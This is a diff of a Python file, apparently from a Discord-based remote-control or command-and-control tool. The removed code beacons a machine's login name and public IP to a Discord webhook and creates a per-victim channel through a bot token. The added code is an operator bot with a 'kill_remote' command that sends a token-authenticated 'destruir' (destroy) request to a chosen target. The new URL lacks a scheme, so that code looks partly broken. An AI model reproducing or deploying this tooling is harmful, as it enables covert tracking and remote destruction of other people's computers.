@@ -1,36 +1,43 @@
+import discord
+from discord import app_commands
 import os
-import sys
-import shutil
-import requests
 from dotenv import load_dotenv
+import requests
 
 load_dotenv()
-
-url = os.getenv('webhook_url_logs')
-guild_id = os.getenv('guild_id')
 token_dc = os.getenv('token_dc')
-
-
-def send(mensagem):
-    payload = {
-        'content': mensagem
-    }
-    response = requests.post(url, json=payload)
-    return response
-
+secret_token = os.getenv('SECRET_TOKEN')
 ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
-usuario = os.getlogin()
 
-criar_canal = {
-    "name": f'{usuario} - {ip_publico}',
-    "type": 0
+client = discord.Client(intents=discord.Intents.default())
+tree = app_commands.CommandTree(client)
 
-}
+async def alvo_autocomplete(interaction: discord.Interaction, current: str):
+    if not interaction.guild:
+        return []
 
-headers = {
-    "Authorization": f"Bot {token_dc}",
-    "Content-Type": "application/json"
-}
+    # Lista canais de texto filtrando pelo que o usuário digitou
+    canais = [
+        app_commands.Choice(name=canal.name, value=str(canal.id))
+        for canal in interaction.guild.text_channels
+        if current.lower() in canal.name.lower()
+    ]
+    return canais[:25]  # Discord aceita no máximo 25
 
-response = requests.post(f'https://discord.com/api/guilds/{guild_id}/channels', json=criar_canal, headers=headers)
-print(response.json()['name'])
+@tree.command(name="kill_remote", description="Executa KILL em outro PC")
+@app_commands.autocomplete(alvo=alvo_autocomplete)
+async def kill_remote(interaction: discord.Interaction, alvo: str):
+    url = f"{ip_publico}/destruir/{alvo}"
+    headers = {"token": secret_token}
+
+    try:
+        r = requests.post(url, headers=headers, timeout=5)
+        if r.status_code == 200:
+            await interaction.response.send_message(f"KILL enviado para alvo `{alvo}` 💀")
+        else:
+            await interaction.response.send_message(f"Erro: {r.text}")
+    except Exception as e:
+        await interaction.response.send_message(f"Falha: {e}")
+
+
+client.run(token_dc)
